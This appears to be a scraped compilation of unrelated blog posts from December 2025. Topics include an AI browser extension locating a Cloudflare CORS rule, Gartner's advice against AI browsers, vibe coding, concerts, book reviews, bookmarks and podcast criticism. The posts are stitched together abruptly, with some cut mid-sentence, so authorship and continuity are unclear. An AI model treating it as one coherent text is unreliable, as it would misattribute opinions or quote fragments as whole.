<p>A while ago I set things up so anything served from the <code>https://static.simonwillison.net/static/cors-allow/</code> directory of my S3 bucket would have open <code>Access-Control-Allow-Origin: *</code> headers. This is useful for hosting files online that can be loaded into web applications hosted on other domains.</p>
<p>Problem is I couldn't remember how I did it! I initially thought it was an S3 setting, but it turns out S3 lets you set CORS at the bucket-level but not for individual prefixes.</p>
<p>I then suspected Cloudflare, but I find the Cloudflare dashboard really difficult to navigate.</p>
<p>So I decided to give Claude in Chrome a go. I installed and enabled the extension (you then have to click the little puzzle icon and click &quot;pin&quot; next to Claude for the icon to appear, I had to ask Claude itself for help figuring that out), signed into Cloudflare, opened the Claude panel and prompted:</p>
<blockquote>
<p><code>I'm trying to figure out how come all pages under http://static.simonwillison.net/static/cors/ have an open CORS policy, I think I set that up through Cloudflare but I can't figure out where</code></p>
</blockquote>
<p>Off it went. It took 1m45s to find exactly what I needed.</p>
<p><img src="https://static.simonwillison.net/static/2025/claude-chrome-cloudflare.jpg" alt="Screenshot of Chrome - on the left is the Cloudflare dashboard. On the right a Claude chat panel which shows the final result: Summary  Found it! Your open CORS policy for the /static/cors/ directory on static.simonwillison.net is configured through Cloudflare Transform Rules, specifically a Response Header Transform Rule named static.simonwillis.net/static/cors-allow/.  Here's exactly what's set up:  Rule Configuration:      Type: HTTP Response Header Transform Rule     Applies to: Any URL matching https://static.simonwillison.net/static/cors-allow/ (wildcard match)     Action: Modifies the response header access-control-allow-origin and sets it to *  This is why all pages under that path have an open CORS policy — the * value for Access-Control-Allow-Origin means any origin can access those resources.  Where to find/modify it in the dashboard:      Go to your domain settings (simonwillison.net)     Navigate to Rules &gt; Rules Overview (in the left sidebar)     Scroll down to Response Header Transform Rules (should show 2 active)     Click on the rule named static.simonwillis.net/static/cors-allow/* to view or edit it  "></p>
<p>Claude's conclusion:</p>
<blockquote>
<p>Found it! Your open CORS policy for the <code>/static/cors/</code> directory on <code>static.simonwillison.net</code> is configured through <strong>Cloudflare Transform Rules</strong>, specifically a <strong>Response Header Transform Rule</strong> named <code>static.simonwillis.net/static/cors-allow/*</code></p>
</blockquote>
<p>There's no &quot;share transcript&quot; option but I used copy and paste and two gnarly Claude Code sessions ( <a href="https://gistpreview.github.io/?56adf4212345d9967c22aab1362b847b">one</a>, <a href="https://gistpreview.github.io/?1d5f524616bef403cdde4bc92da5b0ba">two</a>) to turn it into an HTML transcript which <a href="https://static.simonwillison.net/static/2025/claude-chrome-transcript.html">you can take a look at here</a>.</p>
<p>I remain deeply skeptical of the entire browsing agent category due to my concerns about prompt injection risks—I watched what it was doing here like a <em>hawk</em>—but I have to admit this was a very positive experience.</p>

<p><a href="https://daverupert.com/2025/10/vibe-check-40/">Last vibe check</a> I was super grumpy. Thankfully, I was able to start shaking off that cloud by fixing my mood with music. I am not kidding when I say I got to see three of my favorite bands in the span of a month.</p>
<p><img src="https://cdn.daverupert.com/posts/2025/thebeths.jpg" alt="the beths on stage"></p>
<p>The first was my current favorite band <a href="https://www.thebeths.com/">The Beths</a>. According to Spotify Wrapped I’m a Top 0.2% global fan. They came through Austin and played an incredible set at Emo’s. All the hits. I was enchanted for one evening.</p>
<p>Then a week or so later I saw my friend Richard’s band <a href="https://rlkentopp.bandcamp.com/album/rainbow">Heartswarm</a> play at The Aristocrat. I have a lot of friends who play music and in a town like Austin I was feeling remorse for not enjoying that more at every chance I get.</p>
<p>Then, a couple nights later, I saw one of my all time favorite emo bands when <a href="https://rainermaria.bandcamp.com/">Rainer Maria</a> open for my other absolute most favorite (midwest) emo band <a href="https://www.capnjazz.band/">Cap’n Jazz</a>. The show was so great and the audience was an even 50/50 split between dads over 45 and queer kids under 21. What a cross-section of society! And because my friend Richard is friends with <a href="https://en.wikipedia.org/wiki/Mike_Kinsella">Mike Kinsella</a>, I got to hang out with the him a bit. Cool dude and an honor to finally meet in person.</p>
<p>A couple weeks after that, I took my son and his friend to their first hardcore punk show featuring <a href="https://dark-thoughts.bandcamp.com/album/highway-to-the-end">Dark Thoughts</a> opening for <a href="https://betonarmeoimtl.bandcamp.com/">Béton Armé</a>. First time hearing all these bands but Dark Thoughts was awesome. Béton Armé had incredible energy. But the real surprise was Houston hardcore punk/ska band Liberty &amp; Justice. Being from Houston I wondered if we knew similar people in the punk scene. I didn’t summon up enough courage to ask though because it’s been decades since I lived there, but after texting some friends back home I learned the lead singer is good friends with my old neighbor and grew up in the next town over. Small world.</p>
<h2>Coding vibes</h2>
<p>Despite a heavy workload at work and home projects piling up, I summoned some energy to work on some coding projects at night.</p>
<h3>A tennis app for my wife</h3>
<p>My wife likes to obsess over tennis scores and ratings; not limited to hers and the team she captains, but for anyone she knows in the United States. She was having trouble accessing the site she uses (tennisrecord.com) and I thought we were potentially IP-banned because she uses it so much. the app is kind of a terrible user experience… so why not try to make a good one?</p>
<p>One constraint I added to the project was that I had to vibe code it. Partly because that’s the approximate amount of spoons I had for this project, but also to practice wrangling these machines a bit better.</p>
<p>Vibe coding was –per usual– a rollercoaster. I told it what I wanted (a multi-page Vite app that uses Netlify functions to connect to the USTA API) and it seemed to like that. The agent generated a <code>PRD.md</code>. I read the PRD. It looked good. I made some edits. I ran the plan…</p>
<p>It did not follow the plan. It went off and scaffolded out the entire application and most of the views. While super impressive in such a short amount of time, generally speaking, that’s not what you want? With software I find you want to step down a path iteratively and make sure you’re not repeating the same mistakes. It would benefit LLMs to maintain a tight context window instead of doing a full blow-out on the first prompt… but that’s not what LLMs do, is it? They drive down a road until it ends and tend to go overboard; they build out features you didn’t even ask for. Also worth nothing they charge per token used.</p>
<p>For example it didn’t understand how to write and use web components. It wrote thousands of lines of JavaScript in an imperative way, which is the opposite of what I asked for and the antithesis of the web components ethos which tends to be highly declarative and template driven. After a half-dozen repeated failures I tried the prompt “Use Lit” and seemed to understand that (sometimes). I need to re-read the chatlogs because I was able to turn the corner on quality but it required a lot of hand-holding and babysitting the machine. It excelled at short tasks like “Rename X to Y” but to be honest “Find &amp; Replace in Project” isn’t a hard task for me. I think where it can be good is tedious work like changing API structures (renaming functions, etc) and then extrapolating that change out to the rest of the project.</p>
<p>Ultimately the project died in an unceremonious way when the USTA denied my application for an API key. Boo. I will never know if all those API endpoints that weren’t in the documentation actually worked or if Copilot just invented them. Also impacting the project was the fact that Quiet UI disappeared from the internet, which is a special kind of setback for doc-dependent LLMs. Oh well. I’d rank it a mixed success. I got through my personal quality-via-the-LLM barrier, but trying to corral the stateless machine wasn’t the most enjoyable experience and I didn’t ship the app.</p>
<h3>An app for analog drawing</h3>
<p>I loved graph paper as a kid. I used to buy giant pads of it and make scale architectural models of my house. The algorithm surfaced some cool isomorphic dungeon drawing videos for me but the process of sourcing some graph paper let me down. I wanted to print out a couple sheets of graph paper but I kept getting skeezed out by my options on image search. Low-res JPEGs with shitty logos splattered all over. No sense of how big it’d actually be when I printed it out.</p>
<p><img src="https://cdn.daverupert.com/posts/2025/grid-paper.jpg" alt="screenshot of my grid paper app with some configurable settings in a header and a grid covering the entire background"></p>
<p>So I spent an evening making <a href="http://localhost:4000/2025/11/grid-paper/">my own little Grid Paper app</a>. I’m pleased with the results. It supports grids, dot-grids, isomorphic grids, perspective grids, and dual-hex grids. I have a branch locally that adds normal hex grids and more fidelity but it’s a complete refactor so it’ll take some time to finish out.</p>
<p>All said, I’m happy with the time vs effort results on this project. A couple nights worth of work.</p>
<h2>Retrogaming</h2>
<p>I got a neat little <a href="https://anbernic.com/">Anbernic retro-handheld emulator</a> for Christmas last year but to be honest I hadn’t played it much. The system was lacking a lot of the first-party blockbuster games I loved. Y’know what I’m talking about… the sbarro brothers, the sanics, the pokey-mens, the mega-dudes; those sorts of games.</p>
<p>I mentioned this to a friend and he helped me… <em>ahem</em>… backup some games I had. And that was enough of a spark to inspire me to swap out the default operating system to a custom one called <a href="https://knulli.org/">Knulli</a> and I made it feel neat-o by installing the <a href="https://www.youtube.com/watch?v=MVPUu2BWuqw">Techdweeb theme</a>.</p>
<p>I’m loving it so much more. I’ve been playing through a game where you capture these little critters and use them in ethically-questionable battles against other children and adults. So that’s fun and been a great way to relax that isn’t doomscrolling or YouTube rabbit holes.</p>

<ul>
<li>
<p><a href="https://amzn.to/3IwJqXT">Sapiens</a> ★★★½ - This book very much fits into my historical graphic novel wheelhouse. It suffers some of the common problems with the real-book-to-comic genre (long speeches, hammy conversation setups, etc) and I struggled at the beginning, but towards the middle I latched on and enjoyed it enough to get the second book from the Library… which I didn’t read. One eyebrow-raising bit is that it somewhat opens the door to “These people have different DNA”-type phrenology or supremacy narratives. Woof.</p>
</li>
<li>
<p><a href="https://amzn.to/47hE2Ai">At Home</a> DNF - I did not finish this book, but I did enjoy it. I probably prefer a more linear history lesson on a single topic, but Bill Bryson does something unique and ties together a tapestry of historical anecdotes based on common objects found in his home. I may pick this up again in the future when things slow down and my mind can wander more.</p>
</li>
<li>
<p><a href="https://amzn.to/3JnBqJ7">Slow Down</a> ★★★★½ - Comrades! Degrowth is a topic I’m interested in. How do we break away from the “always grow” cycle of Capitalism and it’s climate death march. Kōhei Saitō suggests communism, leaning on the contemporary writings of Marx that didn’t make it in Das Kapital that were focused around ecological sustainability as opposed to revolution.</p>
</li>
<li>
<p><a href="https://amzn.to/484PBvb">Control Freak</a> ★★ - I’m always up for some video game history and CliffyB’s has played a role in some of gaming’s biggest moments. The book starts with a classic nerd coming-of-age at the dawn of the internet story that is familiar, his father’s passing, but before digging into his time at Epic games, the story takes a sudden turn recounting his own sexual abuse. Then it hops back into video games like nothing happened. The book is soaked in CliffyB’s non-malignant but very apparent narcissism. Name drops. Affairs. Divorce. Matching Lambos. Markers of success CliffyB seems to wear like self-deprecating badges of honor. I don’t mean to take from CliffyB’s successes (Unreal Tournament, Gears of War, Fortnite, etc) and those portions of the book are interesting in their own right, but overall… it felt like a very personal story rather than a general nerds-to-riches type story.</p>
</li>
<li>
<p><a href="https://amzn.to/4jbZagQ">It’s Only Drowning</a> ★★★½ - Author David Litt decides to take up surfing late-in-life. To achieve this goal he must befriend his twenty-something brother-in-law. It’s a story of self-realization and challenging yourself to achieve a difficult goal as well as bridging an awkward familial/generational/political gap. I think it also embodies the male loneliness epidemic; a desire to have relationships with people who aren’t our spouse, to be invited, and to belong.</p>

<h3>📝 <strong>Blogging</strong></h3>
<p>I had a secret theme –that I don’t if anyone picked up on– but I was trying to share things I like. A couple got serious, but most of them were simple posts about a game or YouTube series I like. I think this also helped put me in a better moo.</p>

      <p>I think that many podcasts are basically commentary (see just about any political podcast where the host interviews someone on current events, no need to provide links here…). However, I think there is a growing list of podcasts that provide criticism/critiques of podcasts, similar in some ways to general media criticism or literary criticism. Recently, […]</p>

      <p>
      <p>BTW. Why video &quot;podcasts&quot; will never replace audio-only podcasts. Two reasons. 1. There are places where your eyes aren't available to watch a video, like when you're driving a car. 2. Listening to audio only is different from both audio and video. Audio forces your mind to fill in the blanks, which taps into the listener's creativity. No way to say one is better than the other, but they are different. I watch plenty of video, at home or on a train, but I also like to listen to podcasts when I'm walking or driving, riding in a bus or subway, or waiting in line somewhere.</p>

      <p><img src="https://imgs.scripting.com/2022/04/15/theEggman.png" alt="">I generally am not a podcast reviewer, that is I don't review individual podcasts, except when I'm choosing one for <a href="https://daytona.scripting.com/search?q=%22Blogger%20of%20the%20Year%22">Blogger of the Year</a>, as I'm thinking of doing this year. But there's a whole class of podcasts that I am prepared to love that do it just plain wrong. Current example: The <a href="https://podcasts.apple.com/us/podcast/pluribus-the-official-podcast/id1846198705">official podcast</a> for <a href="https://daytona.scripting.com/search?q=Pluribus">Pluribus</a>. Previous example: The <a href="https://podcasts.apple.com/us/podcast/the-severance-podcast-with-ben-stiller-adam-scott/id1788381175">official podcast</a> for <a href="https://daytona.scripting.com/search?q=Severance">Severance</a>. The reason: It's a bunch of people laughing about how funny they are and how they are the best in the world at what they do. Or some seriously unfunny thing that happened or almost happened on the set. If a friend told you these stories you'd roll your eyes and ask them kindly then desperately to just move along please. They never criticize. Today I listened to the NYT <a href="https://podcasts.apple.com/us/podcast/sunday-special-the-best-tv-of-2025/id1200361736?i=1000742188278">best-of 2025 in TV podcast</a> by their critics, and it was imho exactly the way the official podcasts of hit shows should be. There has to be at least a possibility that they will say something critical, or funny irreverant even inconsiderate things, and not are not 100% self-promotion. The Pluribus podcast is just not interesing. Which is stupid because Pluribus is a very interesting series. I can't imagine too many people listen to the podcast, but then I can't imagine why lots of people do lots of things.</p>

      <h1>Leading Global Research and Advisory Firm Recommends Against Using AI Browsers</h1>

(date: 2025-12-21)
      <p>
      <p><a href="https://blog.jim-nielsen.com/2025/ai-browsers-frontier-security/">I recommended</a> against using an AI browser unless you wanted to participate in a global experiment in security. My recommendation did come with a caveat:</p>
<blockquote>
<p>But probably don’t listen to me. I’m not a security expert</p>
</blockquote>
<p>Well, now the experts (that you pay for) have weighed in.</p>
<p>Gartner, the global research and advisory firm, has come to the conclusion that agentic browsers are too risky for most organizations.</p>
<p>Ground breaking research.</p>
<p>But honestly, credit where it’s due: they’re not jumping on the hype train. In fact, they’re advising against it.</p>
<p>I don’t have access to the original paper (because I’d have to pay Gartner for it), but <a href="https://www.theregister.com/2025/12/08/gartner_recommends_ai_browser_ban/">the reporting on Gartner’s research</a> says this:</p>
<blockquote>
<p>research VP Dennis Xu, senior director analyst Evgeny Mirolyubov, and VP analyst John Watts observe “Default AI browser settings prioritize user experience over security.”</p>
</blockquote>
<p>C’mon, let’s call a spade a spade: they prioritize their maker’s business model over security.</p>
<p>Continuing:</p>
<blockquote>
<p>Gartner’s fears about the agentic capabilities of AI browser relate to their susceptibility to “indirect prompt-injection-induced rogue agent actions, inaccurate reasoning-driven erroneous agent actions, and further loss and abuse of credentials if the AI browser is deceived into autonomously navigating to a phishing website.”</p>
</blockquote>
<p>And that’s just the beginning! It gets worse for large organizations.</p>
<p>The real horror of these AI browsers is that they can help employees to autonomously complete their mandatory trainings:</p>
<blockquote>
<p>The authors also suggest that employees “might be tempted to use AI browsers and automate certain tasks that are mandatory, repetitive, and less interesting” and imagine some instructing an AI browser to complete their mandatory cybersecurity training sessions.</p>
</blockquote>
<p>The horror!</p>
<p>In this specific case, maybe AI browsers aren’t the problem? Maybe they’re a symptom of the agonizing online instructional courses that feign training in the name of compliance?</p>
<p>But I digress. Ultimately, the takeaway here is:</p>
<blockquote>
<p>the trio of analysts think AI browsers are just too dangerous to use</p>
</blockquote>
<p>Imagine that: you take a tool that <em>literally comes with a warning of being untrustworthy</em>, you embed it as foundational in another tool, and now you have two tools that are untrustworthy. Who would’ve thought?</p>

Reminds me, this is the kind of thing <a href="https://shownotes.scripting.com/scripting/2025/12/18/whatWouldFirefoxDo.html">Firefox</a> could be excellent at. Give it a way for an app to say hey the user asked for a transcript. Here it is. Save it where they're expecting to find it. No reason the browser can't have a JavaScript accessible API, as far as I know there is no rule they can't add functionality there.</p>

Just did a project, where I was setting up a playground just to ask ChatGPT how to get CSS to do something like what I want. While CSS is impossible imho for me to ever understand, it has mastered it, and was able to answer the question I brought before I asked it. It got it right. I asked how did you figure out that's what I came here to ask about?? It gave me an exact technical reason. If we keep going this way soon we're going to wonder at the human hubris to think we could develop systems that could in any way equal the systems it can develop. We've been thinking about this eventuality for my whole life, now it's here.</p>

      <h1>Some Favorite Sentences of 2025</h1>

(date: 2025-12-21)
      <p>
      <h3><strong><em>Welcome to the Subscription Edition of A Newsletter of Humorous Writing. Our paid subscribers keep the weekly newsletter running, and we’re deeply grateful for your support. (And if you’re not already subscribed,</em></strong> <a href="https://buy.stripe.com/cN25mI1X21Gp6XeeUZ?utm_source=humorouswriting&amp;utm_medium=email"><strong><em>you can sign up here</em></strong></a> <strong><em>.)</em></strong></h3>
<p><em>Today we’re running down some of our favorite sentences from pieces and articles published in 2025. After that, we’ve got a couple of recommendations of things we’ve been into lately: A new TV show and three, simple, red holiday cocktails.</em></p>
<hr>
<h2>Some Favorite Sentences of 2025</h2>
<p>We talk a lot about sentence-level joke writing in this newsletter (in fact, we’re long overdue to dedicate an entire premium edition to the topic), and so, as part of our end-of-year wrap-up, we thought it would be appropriate for us to get real granular and highlight some of our very favorite sentences that we read in 2025, and write a little about what makes them so great.</p>
<p>Putting together this list made us appreciate even more just how incredibly challenging it is to write a single sentence that is funny entirely on its own. The vast majority of funny sentences in short humor pieces rely on context to make them funny: The context of the title and premise, a previous sentence that sets up a punchline, the way the piece as a whole is heightening, and so on.</p>
<p>There were lots of hilarious paragraphs and two-sentence combos that we were tempted to include, but in assembling this list we were adamant that we were only going to pick SINGLE sentences that might, entirely in isolation, make someone laugh. (Show this list to someone who hasn’t read any of the pieces and let us know how it goes!)</p>
<p>The fact that we were so strict about this rule also means that there’s actually little overlap between this list and our list of our favorite PIECES of the year (which will be hitting your inbox next weekend, with no paywall). While there are tons of great sentences in our favorite pieces of the year, many of them work best as part of a whole, while the sentences below stand on their own, and stand out, in a very particular way.</p>

      <p>
      <p>I never posted so much as in 2025. Instead of analyzing my own blog production, I chose to interview Claude Opus 4.5 and Gemini Pro 3 about it and get their predictions for next year (with a surprise guest). They never said “You’re absolutely right”, which is reassuring. They were also quite humorous at times. I had a blast co-writing this with them.</p>

      <h1>Weekly Bookmarks</h1>

(date: 2025-12-21)
      <p>
      <p>These are some things I’ve wandered across on the web this week.</p>
<h2>🔖 <a href="https://www.kansalliskirjasto.fi/en/about-us/duties-and-strategy/library-policies/principles-ai-use-national-library-finland">Principles of AI use at the National Library of Finland</a></h2>
<p>The National Library of Finland has drawn up both general principles for
the use of AI and internal practical guidelines for using AI tools to
support everyday work.</p>
<h2>🔖 <a href="https://www.mixcloud.com/spheruleus/playlists/yearbooks/">Harry Towell Yearbooks</a></h2>
<p>My name is Harry Towell from Lincolnshire, UK and under my own name and
as Glåsbird, I produce Ambient, Electro Acoustic and Modern Classical
music. I am not just active in recording music - I also run the
Whitelabrecs record label too:</p>
<h2>🔖 <a href="https://l5lua.org/">Welcome to L5</a></h2>
<p>L5 is a fun, fast, cross-platform, and lightweight implementation of the
Processing API in Lua. It is a free and open source coding library to
make interactive artwork on the computer, aimed at artists, designers,
and anyone that wants a flexible way to prototype art, games, toys, and
other software experiments in code.</p>
<h2>🔖 <a href="https://youtu.be/2A4bs40scSo">extremely coolshell trick I did not know about</a></h2>
<p>A short video about process substitution in Unix shell and why it is
useful, especially in situations where you need a temporary file as part
of some pipeline.</p>
<h2>🔖 <a href="https://youtube.com/watch?v=XGjy73DPScc">Blackbird &amp; Jesu, Joy of Man’s Desiring - Hiromi Uehara</a></h2>
<h2>🔖 <a href="https://martin.kleppmann.com/2025/12/08/ai-formal-verification.html">Prediction: AI will make formal verification go mainstream</a></h2>
<p>Much has been said about the effects that AI will have on software
development, but there is an angle I haven’t seen talked about: I
believe that AI will bring formal verification, which for decades has
been a bit of a fringe pursuit, into the software engineering mainstream</p>
<h2>🔖 <a href="https://softwarefoundations.cis.upenn.edu/">Software Foundations Series</a></h2>
<p>The Software Foundations series is a broad introduction to the
mathematical underpinnings of reliable software.</p>
<p>The principal novelty of the series is that every detail is one hundred
percent formalized and machine-checked: the entire text of each volume,
including the exercises, is literally a “proof script” for the Coq proof
assistant.</p>
<p>The exposition is intended for a broad range of readers, from advanced
undergraduates to PhD students and researchers. No specific background
in logic or programming languages is assumed, though a degree of
mathematical maturity is helpful. A one-semester course can expect to
cover Logical Foundations plus most of Programming Language Foundations
or Verified Functional Algorithms, or selections from both.</p>
<h2>🔖 <a href="https://youtu.be/zl-wAqplQAo">LISTERS: AGlimpse Into Extreme Bird Watching</a></h2>

way.</p>
<h2>🔖 <a href="https://doc.rust-lang.org/rust-by-example/index.html">Rust By Example</a></h2>
<p>Rust is a modern systems programming language focusing on safety, speed,
and concurrency. It accomplishes these goals by being memory safe
without using garbage collection.</p>

illustrate various Rust concepts and standard libraries. To get even
more out of these examples, don’t forget to install Rust locally and
check out the official docs. Additionally for the curious, you can also
check out the source code for this site.</p>
<h2>🔖 <a href="https://projectarcc.org/2025/12/12/climate-yap-recap-ai-energy-facilities-and-planning/">Climate Yap Recap: AI, Energy, Facilities, and Planning</a></h2>
<p>Project ARCC members have been meeting regularly over the last several
months to talk climate change and archives. These informal Climate Yaps
are a place to share what we’re thinking about and working on, big and
small wins, and challenges along the way.</p>

<h2>🔖 <a href="https://www.archiveslab.org/projects/fighting-erasure">fighting erasure: digitizing Gaza’s genocide and the War on Lebanon</a></h2>
<p>Fighting Erasure: Digitizing Gaza’s Genocide and the War on Lebanon is a
comprehensive project launched on October 8, 2023 aimed at documenting
and protecting indigenous land, built environments, archives, and
heritage in Gaza and elsewhere in Palestine, as well as in South Lebanon
and the surrounding areas. The project includes a series of advocacy,
education, and capacity building activities, along with the critical
work of archiving, preserving, and providing access to what may become
one of the most thoroughly documented genocides and land colonization in
history. We archive against genocide by documenting human rights
violations and settlements expansion, as well as its cultural dimensions
through heritage and archival erasure. We archive against genocide by
using visualization techniques and new media to educate about the human
toll of the violence. We archive against genocide by providing the
knowledge, training, equipment, resources, and planning and coordination
needed locally to build capacity, resilience, and networks for archival
protection, land tenure documentation, and heritage preservation. We
advocate to, and engage with, diverse publics and decision makers to
promote the safeguarding of heritage and archives, the reclamation of
colonized lands and return of displaced people.</p>
<h2>🔖 <a href="https://ip.thc.org/">World’s largestInternet Domain Database</a></h2>

limitless domain related recon without having to pay a unreasonable
amount of money (which most other services charge). We do the hard work
of sourcing, resolving, cleaning, indexing and making available domain
data for research purposes without any fee or paywall</p>

blog, we share case studies using open metadata and tools.</p>
<h2>🔖 <a href="https://trigger.dev/blog/shai-hulud-postmortem">How we got hit by Shai-Hulud: A complete post-mortem</a></h2>
<p>On the evening of November 24th, around 20:27 UTC (9:27 PM local time in
Germany), one of our engineers was experimenting with a new project.
They ran a command that triggered pnpm install. At that moment,
somewhere in the dependency tree, a malicious package executed.</p>
<h2>🔖 <a href="https://press.princeton.edu/books/hardcover/9780691263465/free-gifts">Free Gifts: Capitalism and the Politics of Nature</a></h2>
<p>Capitalism is typically treated as a force for relentless
commodification. Yet it consistently fails to place value on vital
aspects of the nonhuman world, whether carbon emissions or entire
ecosystems. In Free Gifts, Alyssa Battistoni explores capitalism’s
persistent failure to value nature, arguing that the key question is not
the moral issue of why some kinds of nature shouldn’t be commodified,
but the economic puzzle of why they haven’t been. To understand
contemporary ecological problems from biodiversity collapse to climate
change, she contends, we have to understand how some things come to have
value under capitalism—and how others do not. To help us do so,
Battistoni recovers and reinterprets the idea of the free gift of nature
used by classical economic thinkers to describe what we gratuitously
obtain from the natural world, and builds on Karl Marx’s critique of
political economy to show how capitalism fundamentally treats nature as
free for the taking. This novel theory of capitalism’s relationship to
nature not only helps us understand contemporary ecological breakdown,
but also casts capitalism’s own core dynamics in a new light.</p>

      <p>
      <p>On 5/15/2017 I decided I wanted my old blog back. I was fed up trying to write for all the inconsistent publishing platforms, twitter, facebook, google reader, medium, etc. It worked. Never looked back. Like emerging from a bad dream. Because the web is really good for writers.</p>

      <p><img src="https://imgs.scripting.com/2025/09/24/ripVanWinkle.png" alt=""><a href="https://www.facebook.com/dave.winer.12/posts/pfbid02cQBPJY4BunfAt9ergzpCxn1TuhjZc8q8KGHbS9ztjQjUvSpKRZF4eAoXatS1MADEl">2019 on Facebook</a>: &quot;People are too judgmental, which is a shame because in the end, which is coming soon enough for all of us, your opinion of other people doesn’t matter. Sorry if I’m telling you something you don’t already know.&quot;</p>
<p>On the other hand, we can't help but be judgmental. It's programmed into our DNA at a deep level. You have to form an instant opinion of other animals, any delay could cost your life. Better to assume the worst. Fight or flight. This happens esp if you don't know you're doing it, so don't know to watch for it.</p>
<p>It isn't until their 40s that most people understand that what they see isn't what everyone else sees. If you think there's an objective truth that we all experience, you're not getting the point. There is no consistent <a href="https://daytona.scripting.com/search?q=%22view%20from%20nowhere%22">view from nowhere</a> because everyone is <em>somewhere.</em> ;-)</p>
<p>I know where I was when I really understood this, not because I read it somewhere, or a teacher told me about it. I was riding on the 4 train north in the Bronx, where the train runs as an elevated on <a href="https://www.flickr.com/photos/jag9889/3195371318">Jerome Ave</a>. I had ridden this train for three years as a high school student, and never thought about all the six story apartment buildings whose backs faced the train. As you went by, you passed by one family for every two or three windows. A whole set of people with relationships, problems, tragedy, joy, dreams, the whole thing. They don't come from where you come from, inside each house there are stories, lives, people. You'll probably never know anything about any of them. I wasn't sad about this.</p>
<p><img src="https://imgs.scripting.com/2025/12/20/viewFrom4TrainBronx.png" alt=""></p>
<p>View from the 4 train described above.</p>
<p>When I was a kid we went to a bungalow colony in upstate NY, around where I live now. I was less than 10 years old, so were my friends. We used to do things together that the adults didn't know about. There was an abandoned house we used to hang out in, mostly open to the elements. We also played in a graveyard and talked about what the families whose names were on the headstones were doing. Having dinner maybe? Listening to the Mets on the radio? (No TV in the mountains.) So the thought had occurred to us at that point in life that behind doors there were things happening that we could only imagine. I guess what you learn later is that you <em>can't</em> imagine, and if you want to know you have to ask and listen.</p>
<p>I saw a critique of my writing that said I don't put enough titles in my writing. I didn't want to answer it in context, because I wanted to explain more generally. I tried to write the way the world was forcing me to write for over ten years, between 2006 and <a href="http://scripting.com/2017/05/05/iWantMyOldBlogBack.html">2017</a>, and I came to hate it. My writing is a way of getting things out of my head and into a place where I can find it later. It's more interesting to me if it's published. I am vision-impaired too. But if you account for every preference, as I learned between 2006 and 2017, the writing ends up worse than worthless. It becomes something you have to overcome. In the end you have write about why this is the wrong way to write.</p>

<p>The Raspberry Pi only has 1 lane of PCIe Gen 3 bandwidth available for a connection to an eGPU. That's not much. Especially considering a modern desktop has at least one slot with 16 lanes of PCIe Gen 5 bandwidth. That's 8 GT/s versus 512 GT/s. Not a fair fight.</p>

(date: 2025-12-20)
      <p>
      <p>&quot;Airbus is preparing to tender a major contract to migrate mission-critical workloads to a digitally sovereign European cloud – but estimates only an 80/20 chance of finding a suitable provider.&quot;</p>

      <blockquote>
<p>In 2025, Reinforcement Learning from Verifiable Rewards (RLVR) emerged as the de facto new major stage to add to this mix. By training LLMs against automatically verifiable rewards across a number of environments (e.g. think math/code puzzles), the LLMs spontaneously develop strategies that look like &quot;reasoning&quot; to humans - they learn to break down problem solving into intermediate calculations and they learn a number of problem solving strategies for going back and forth to figure things out (see DeepSeek R1 paper for examples).</p>

      <p>I despise this design pattern, because it’s inherently slower than signing in using an email/password combination that was saved to my passwords app (which is Apple Passwords) and autofilled by my web browser. It’s not just a little slower but *a lot* slower.</p>

      <p><strong><a href="https://ngrok.com/blog/prompt-caching/">Sam Rose explains how LLMs work with a visual essay</a></strong></p>
<p>Sam Rose is one of my favorite authors of <a href="https://simonwillison.net/tags/explorables/">explorable interactive explanations</a> - here's <a href="https://samwho.dev/">his previous collection</a>.</p>
<p>Sam joined ngrok in September as a developer educator. Here's his first big visual explainer for them, ostensibly about how prompt caching works but it quickly expands to cover tokenization, embeddings, and the basics of the transformer architecture.</p>
<p>The result is one of the clearest and most accessible introductions to LLM internals I've seen anywhere.</p>

      <p>I usually only drink iced coffee, even if it's cold outside, but lately I've been craving a single cup of <em>hot</em> coffee esp when a basketball game is about to come on. I'm one of those old guys who falls asleep watching their favorite team <a href="https://sny.tv/articles/knicks-tyler-kolek-pacers-career-game-preparation">kick NBA ass</a>. So anyway I decided to treat myself to one of those fancy new-fangled Keurig <a href="https://www.cuisinart.com/soho-single-serve-coffee-maker/SS-7TR.html?srsltid=AfmBOorxELmhJGWcs7VBSRrE1fkga0Ke5BaIvAL9pyH3r2dolCnix858">single-cup coffee makers</a>. I'm drinking my first cup. Works as advertised. Took a few tries before it woke up. I am now drinking a fresh cup of hot coffee and thinking now I finally have everything I could possibly ever want.</p>

      <h4>Revived distro returns on Arch with KDE Plasma, global menus, and a familiar macOS-style sheen</h4>
<p>The new pearOS distro is a Romanian project that picks up the concepts behind the original Pear Linux from 2011 and updates them. It's not going to turn the distro world upside down, but it's fun, interesting, and a showcase for the versatility and customizability of the Linux desktop.</p>

      <p>The standard view of evolution is that living things are shaped by cold-hearted competition. And there is no doubt that today's plants and animals carry the genetic legacy of ancestors who fought fiercely to survive and reproduce. But in this hour that we first broadcast back in 2010, we wonder whether there might also be a logic behind sharing, niceness, kindness ... or even, self-sacrifice. Is altruism an aberration, or just an elaborate guise for sneaky self-interest? Do we really live in a selfish, dog-eat-dog world? Or has evolution carved out a hidden code that rewards genuine cooperation?</p>

      <p>
      <p><img src="https://imgs.scripting.com/2025/11/15/pluribus.png" alt="">You have been warned, spoilers follow...</p>
<p>The whole thing is the book Carol is writing, about writing a book, inside the book she's writing another book. The book I'm speaking of is the one where it's all about Carol.</p>
<p>Everywhere she goes people stop and say hello, and address her by her name.</p>
<ul>
<li>Hi Carol!</li>
<li>Congrats Carol!</li>
<li>Carol, we will move heaven and earth to make you happy.</li>
<li>You suck Carol !!!!</li>
</ul>
<p>In the book she ends up changing them back, un-joining them, and they keep the good qualities they got from being joined, and can be individually creative as they were before the switch.</p>
<p>Also, btw -- <a href="https://en.wikipedia.org/wiki/John_Cena">John Cena</a> says their situation isn't sustainable, but neither is the one we are in now ourselves, in reality, in our reality.</p>
<p>She teaches her lover, Zosia, to think in the first person.</p>
<p>Carol is right about everything because this is her book.</p>
<p>You can see it happening on her whiteboard.</p>
<p>The show could be titled The Adventures of Carol, as told by Carol.</p>
<p><img src="https://imgs.scripting.com/2025/12/19/youSuckCarol.png" alt="">BTW, I might love a podcast of just the writers of the show every week, perhaps interviewed by writers who did not write it, asking questions. It might suck as much as the one they do now, but it also might be great. It would stick to the story, not about praising everyone, kind of like interviews of sports heroes (which are mostly nauseating, except for the few have the gift of gab, who are fun while never saying anything remotely bad about anyone). The people they'd talk about are the people <em>they created.</em></p>

